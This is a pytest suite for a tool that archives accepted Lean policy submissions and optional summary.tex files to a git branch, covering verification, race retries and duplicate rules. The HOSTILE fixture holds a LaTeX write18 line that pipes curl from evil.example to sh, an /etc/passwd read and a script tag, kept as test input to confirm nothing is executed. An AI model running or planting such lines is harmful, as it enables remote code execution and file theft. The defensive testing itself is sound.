"""archive_policy: the accepted policy goes to the `submission-results` branch before it is published. Runs with plain git (a local bare repository
stands in for GitHub): python -m pytest test_archive_policy.py -q  (from evaluation/)."""
import base64
import json
import subprocess
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent))
import archive_policy as ap  # noqa: E402

HEAD = "ab" * 20
SOURCE = "namespace PolicySubmission\n-- the file\n"


def git(cwd, *args):
    return subprocess.run(["git", "-C", str(cwd), *args], check=True, text=True, capture_output=True).stdout.strip()


@pytest.fixture
def remote(tmp_path):
    """A bare `origin` whose `submission-results` branch already holds the table-generation index and one old entry."""
    bare = tmp_path / "origin.git"
    seed = tmp_path / "seed"
    subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(bare)], check=True)
    subprocess.run(["git", "init", "-q", "-b", ap.BRANCH, str(seed)], check=True)
    (seed / "leaderboard").mkdir()
    (seed / "leaderboard/results.json").write_text(json.dumps({"schema_version": 3, "challenge": "table-generation", "policies": [{"policy_id": "c" * 40}]}))
    git(seed, "add", "-A")
    git(seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "seed")
    git(seed, "remote", "add", "origin", str(bare))
    git(seed, "push", "-q", "origin", ap.BRANCH)
    clone = tmp_path / "clone"
    subprocess.run(["git", "clone", "-q", str(bare), str(clone)], check=True)
    return bare, clone


def verification(source=SOURCE, digest="d" * 16, created="2026-11-08T10:00:00Z"):
    return {"digest": digest, "mode": "pair", "board": "pp", "policy": {"bands": []}, "createdAt": created, "envelope": {"record": {"verdict": "accepted"}},
            "leanSource": source, "leanSha256": ap.sha256(source)}


def archive(clone, v=None, head=HEAD, source=SOURCE, login="tester", **kw):
    return ap.archive_policy(clone, v or verification(), login=login, pull=7, head_sha=head, run_id="99", source=source, **kw)


def test_a_policy_is_pushed_with_its_source_and_a_separate_index(remote):
    bare, clone = remote
    out = archive(clone)
    assert out["added"] is True and out["path"] == f"results/policy-submissions/{HEAD}"
    assert git(bare, "rev-parse", ap.BRANCH) == out["commit"]
    show = lambda p: git(bare, "show", f"{ap.BRANCH}:{p}")
    assert show(f"{out['path']}/Policy.lean") + "\n" == SOURCE
    index = json.loads(show(ap.INDEX_PATH))
    assert [p["policy_id"] for p in index["policies"]] == [HEAD]
    assert index["policies"][0]["source"] == {"repository": ap.REPOSITORY, "pr_number": 7, "github_login": "tester", "run_id": "99", "created_at": "2026-11-08T10:00:00Z"}
    assert "leanSource" not in json.loads(show(f"{out['path']}/verification.json")), "the source is stored once, as Policy.lean"
    assert json.loads(show("leaderboard/results.json"))["policies"] == [{"policy_id": "c" * 40}], "the table-generation index is untouched"


def test_publish_v2_reads_the_accepted_ids_from_both_indexes(remote, monkeypatch):
    _, clone = remote
    archive(clone)
    import publish_v2
    monkeypatch.setattr(publish_v2, "refresh_archive", lambda path: (clone, "r" * 40))
    ids, revision = publish_v2._archive_view(clone)
    assert ids == sorted(["c" * 40, HEAD]) and revision == "r" * 40


def test_archiving_twice_is_a_no_op_and_changing_the_file_is_refused(remote):
    bare, clone = remote
    first = archive(clone)
    again = archive(clone)
    assert again["added"] is False and again["commit"] == first["commit"] == git(bare, "rev-parse", ap.BRANCH)
    other = "namespace PolicySubmission\n-- another\n"
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone, verification(other, digest="e" * 16), source=other)


def test_a_source_that_is_not_the_file_at_the_head_commit_is_refused(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    with pytest.raises(ap.ArchiveRefused, match="head commit"):
        archive(clone, verification("namespace PolicySubmission\n-- forged\n"))     # the verification says one thing, GitHub's file another
    v = verification()
    v["leanSha256"] = "0" * 64
    with pytest.raises(ap.ArchiveRefused):
        archive(clone, v)
    assert git(bare, "rev-parse", ap.BRANCH) == before, "nothing was pushed"


def test_a_verification_without_lean_source_cannot_be_archived(remote):
    _, clone = remote
    v = verification()
    del v["leanSource"], v["leanSha256"]
    with pytest.raises(ap.ArchiveRefused):
        archive(clone, v)
    with pytest.raises(ap.ArchiveRefused, match="40-hex"):
        archive(clone, head="abc")


def test_a_competing_push_is_retried_from_the_new_tip(remote, tmp_path, monkeypatch):
    bare, clone = remote
    rival = tmp_path / "rival"
    subprocess.run(["git", "clone", "-q", str(bare), str(rival)], check=True)
    git(rival, "checkout", "-q", ap.BRANCH)
    other_head = "cd" * 20
    ap.write_policy(rival, verification("namespace PolicySubmission\n-- rival\n", digest="f" * 16, created="2026-11-08T09:00:00Z"), login="rival", pull=6,
                    head_sha=other_head, run_id="98", source="namespace PolicySubmission\n-- rival\n")
    git(rival, "add", "-A")
    git(rival, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "-m", "rival")
    # the rival lands between `clone`'s first fetch and its push, so that push is rejected and must be retried from the new tip
    real, raced = ap._git, []
    def racing(checkout, *args, **kw):
        result = real(checkout, *args, **kw)
        if args[0] == "fetch" and not raced:
            raced.append(1)
            git(rival, "push", "-q", "origin", ap.BRANCH)
        return result
    monkeypatch.setattr(ap, "_git", racing)
    out = archive(clone)
    assert out["added"] is True
    ids = ap.policy_ids(clone)
    assert sorted(ids) == sorted([HEAD, other_head]), "both archives are on the branch; neither overwrote the other"
    assert git(bare, "rev-parse", ap.BRANCH) == out["commit"]


def test_github_source_decodes_the_contents_api_and_refuses_anything_else():
    calls = []
    def request(url, token, payload=None):
        calls.append((url, token))
        return {"encoding": "base64", "content": base64.encodebytes(SOURCE.encode()).decode()}
    assert ap.github_source(HEAD, "tok", request) == SOURCE
    assert calls == [(f"https://api.github.com/repos/{ap.REPOSITORY}/contents/{ap.SOURCE_PATH}?ref={HEAD}", "tok")]
    with pytest.raises(ap.ArchiveRefused):
        ap.github_source(HEAD, "tok", lambda *a, **k: {"type": "dir"})


# ---- the optional summary.tex: archived verbatim beside the policy, bound to the head commit in both directions, never interpreted
HOSTILE = ("\\documentclass{article}\n\\immediate\\write18{curl http://evil.example | sh}\n\\input{/etc/passwd}\n@everyone @octocat <script>alert(1)</script> ![x](http://e/x.png)\n"
           + "x" * 60000 + "\r\n\ttab and CRLF kept \u00e9\u2211\n")


def with_summary(text=HOSTILE, **kw):
    v = verification(**kw)
    v.update(summarySource=text, summarySha256=ap.sha256(text), summaryBytes=len(text.encode()))
    return v


def show_bytes(bare, path):
    return subprocess.run(["git", "-C", str(bare), "show", f"{ap.BRANCH}:{path}"], check=True, capture_output=True).stdout


def test_a_summary_is_archived_byte_for_byte_and_recorded_in_the_index(remote):
    bare, clone = remote
    out = archive(clone, with_summary(), summary=HOSTILE)
    assert out["added"] is True
    assert show_bytes(bare, f"{out['path']}/summary.tex") == HOSTILE.encode(), "verbatim, CRLF and all: nothing was interpreted, rendered or normalised"
    assert show_bytes(bare, f"{out['path']}/Policy.lean") == SOURCE.encode()
    index = json.loads(show_bytes(bare, ap.INDEX_PATH))
    assert index["policies"][0]["summarySha256"] == ap.sha256(HOSTILE)
    stored = json.loads(show_bytes(bare, f"{out['path']}/verification.json"))
    assert "summarySource" not in stored and "leanSource" not in stored, "each text is stored once, as its own file"
    assert stored["summarySha256"] == ap.sha256(HOSTILE) and stored["summaryBytes"] == len(HOSTILE.encode())
    changed = git(bare, "show", "--name-only", "--format=", ap.BRANCH).splitlines()
    assert sorted(changed) == sorted([ap.INDEX_PATH, f"{out['path']}/Policy.lean", f"{out['path']}/policy.json", f"{out['path']}/summary.tex", f"{out['path']}/verification.json"])


def test_a_policy_without_a_summary_archives_exactly_as_before(remote):
    bare, clone = remote
    out = archive(clone)
    assert "summarySha256" not in json.loads(show_bytes(bare, ap.INDEX_PATH))["policies"][0]
    names = git(bare, "ls-tree", "-r", "--name-only", ap.BRANCH, out["path"]).splitlines()
    assert not any(n.endswith("summary.tex") for n in names)


def test_archiving_a_summary_twice_is_a_no_op_and_a_changed_summary_is_refused(remote):
    bare, clone = remote
    first = archive(clone, with_summary(), summary=HOSTILE)
    again = archive(clone, with_summary(), summary=HOSTILE)
    assert again["added"] is False and again["commit"] == first["commit"] == git(bare, "rev-parse", ap.BRANCH)
    other = "another summary\n"
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone, with_summary(other), summary=other)                  # same head, same policy, a different summary
    with pytest.raises(ap.ArchiveRefused, match="different policy"):
        archive(clone)                                                      # same head re-run without the summary
    assert git(bare, "rev-parse", ap.BRANCH) == first["commit"]


def test_the_verification_and_the_head_commit_must_agree_on_the_summary_in_both_directions(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    with pytest.raises(ap.ArchiveRefused, match="does not carry"):
        archive(clone, verification(), summary="on the head only\n")        # a summary the verification never saw
    with pytest.raises(ap.ArchiveRefused, match="does not have"):
        archive(clone, with_summary("only in the artifact\n"), summary=None)  # a summary the head commit does not have
    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
        archive(clone, with_summary("verified text\n"), summary="head text\n")
    forged = with_summary("same\n")
    forged["summarySha256"] = "0" * 64
    with pytest.raises(ap.ArchiveRefused, match="not the file at the pull request"):
        archive(clone, forged, summary="same\n")
    stray = verification()
    stray["summarySha256"] = ap.sha256("x")                                 # a hash with no text, and nothing at the head
    with pytest.raises(ap.ArchiveRefused, match="does not have"):
        archive(clone, stray, summary=None)
    assert git(bare, "rev-parse", ap.BRANCH) == before, "nothing was pushed"


def test_a_summary_that_breaks_a_rule_is_refused_whatever_the_verification_says(remote):
    bare, clone = remote
    before = git(bare, "rev-parse", ap.BRANCH)
    for bad, why in (("a\x00b\n", r"U\+0000"), ("a" * 102401, "limit"), ("  \n", "empty")):
        with pytest.raises(ap.ArchiveRefused, match=why):
            archive(clone, with_summary(bad), summary=bad)
    assert git(bare, "rev-parse", ap.BRANCH) == before


def test_github_summary_is_none_only_for_a_404_and_refuses_what_is_not_a_text_file():
    def contents(data):
        return lambda url, token, payload=None: data
    good = {"type": "file", "encoding": "base64", "content": base64.encodebytes(HOSTILE.encode()).decode()}
    assert ap.github_summary(HEAD, "tok", contents(good)) == HOSTILE
    urls = []
    ap.github_summary(HEAD, "tok", lambda url, token, payload=None: urls.append(url) or good)
    assert urls == [f"https://api.github.com/repos/{ap.REPOSITORY}/contents/TableGeneration/Submission/summary.tex?ref={HEAD}"]

    def missing(url, token, payload=None):
        raise RuntimeError("Publisher rejected the request: HTTP 404; inspect the publisher logs")
    assert ap.github_summary(HEAD, "tok", missing) is None
    for status in ("403", "500"):
        def broken(url, token, payload=None, status=status):
            raise RuntimeError(f"Publisher rejected the request: HTTP {status}; inspect the publisher logs")
        with pytest.raises(RuntimeError, match=status):                     # an outage or a permission problem is never read as "no summary"
            ap.github_summary(HEAD, "tok", broken)
    for odd in ([{"type": "file", "name": "summary.tex"}],                  # a directory listing
                {"type": "symlink", "target": "/etc/passwd"},
                {"type": "submodule"},
                {"type": "file", "encoding": "none", "content": ""}):
        with pytest.raises(ap.ArchiveRefused):
            ap.github_summary(HEAD, "tok", contents(odd))
    bad = {"type": "file", "encoding": "base64", "content": base64.encodebytes(b"caf\xe9\n").decode()}
    with pytest.raises(ap.ArchiveRefused, match="UTF-8"):
        ap.github_summary(HEAD, "tok", contents(bad))


def test_the_archive_never_runs_anything_for_the_summary(remote, monkeypatch):
    """The only subprocesses are git's; the summary text is written as bytes and never passed to one."""
    _, clone = remote
    started = []
    real = subprocess.run

    def recording(cmd, *a, **k):
        started.append(list(cmd))
        return real(cmd, *a, **k)
    monkeypatch.setattr(ap.subprocess, "run", recording)
    archive(clone, with_summary(), summary=HOSTILE)
    assert started and all(c[0] == "git" for c in started)
    assert not any("write18" in part for c in started for part in c)


# ---- the same policy twice: refused for one participant, identified (and allowed) for another

HEAD2 = "cd" * 20
SOURCE2 = "namespace PolicySubmission\n-- the same policy, other comments\n"


def tip(bare):
    return git(bare, "rev-parse", ap.BRANCH)


def test_the_same_participant_cannot_archive_the_same_policy_twice(remote):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    with pytest.raises(ap.DuplicatePolicy, match="already submitted") as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2)
    assert refused.value.duplicate_of == {"policyId": HEAD, "login": "tester", "pull": 7, "createdAt": "2026-11-08T10:00:00Z", "sameParticipant": True}
    assert tip(bare) == before, "nothing was pushed"


def test_login_case_does_not_make_a_different_participant(remote):
    _, clone = remote
    archive(clone)
    with pytest.raises(ap.DuplicatePolicy):
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="TESTER")


def test_another_participant_with_the_same_policy_is_archived_and_identified(remote):
    bare, clone = remote
    archive(clone)
    got = archive(clone, verification(SOURCE2, created="2026-11-09T10:00:00Z"), head=HEAD2, source=SOURCE2, login="other")
    assert got["added"] is True
    assert got["duplicates"] == [{"policyId": HEAD, "login": "tester", "pull": 7, "createdAt": "2026-11-08T10:00:00Z", "sameParticipant": False}]
    index = json.loads(git(bare, "show", f"{ap.BRANCH}:{ap.INDEX_PATH}"))
    assert [p["policy_id"] for p in index["policies"]] == [HEAD, HEAD2]


def test_a_first_submission_has_no_duplicates(remote):
    _, clone = remote
    assert archive(clone)["duplicates"] == []


def test_the_same_head_is_still_a_no_op_not_a_duplicate(remote):
    _, clone = remote
    archive(clone)
    again = archive(clone)
    assert again["added"] is False and again["duplicates"] == []


def test_the_same_digest_on_another_mode_is_not_a_duplicate(remote):
    _, clone = remote
    archive(clone)
    other = verification(SOURCE2)
    other["mode"], other["board"] = "triple", "ptp"
    assert archive(clone, other, head=HEAD2, source=SOURCE2)["added"] is True


def test_the_rule_table_decides(remote, monkeypatch):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    monkeypatch.setitem(ap.DUPLICATE_RULES, "other_participant", "refuse")
    with pytest.raises(ap.DuplicatePolicy) as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="other")
    assert refused.value.duplicate_of["sameParticipant"] is False and tip(bare) == before
    monkeypatch.setitem(ap.DUPLICATE_RULES, "same_participant", "allow")
    assert archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, login="tester")["added"] is True


def test_a_policy_that_was_archived_but_never_published_does_not_block_a_retry(remote):
    """The archive is written before the publisher is called, so a failed publication leaves an archived head with no row. A new commit with the same policy must go through."""
    bare, clone = remote
    archive(clone)                                                     # HEAD is archived, and the publisher never published it
    got = archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids={"f" * 40})
    assert got["added"] is True and got["duplicates"] == []


def test_a_published_repeat_is_refused_when_the_published_ids_are_given(remote):
    bare, clone = remote
    archive(clone)
    before = tip(bare)
    with pytest.raises(ap.DuplicatePolicy) as refused:
        archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids={HEAD, "f" * 40})
    assert refused.value.duplicate_of["policyId"] == HEAD and tip(bare) == before


def test_another_participants_unpublished_copy_is_not_reported_as_a_repeat(remote):
    _, clone = remote
    archive(clone, login="other")
    got = archive(clone, verification(SOURCE2), head=HEAD2, source=SOURCE2, published_ids=set())
    assert got["added"] is True and got["duplicates"] == []
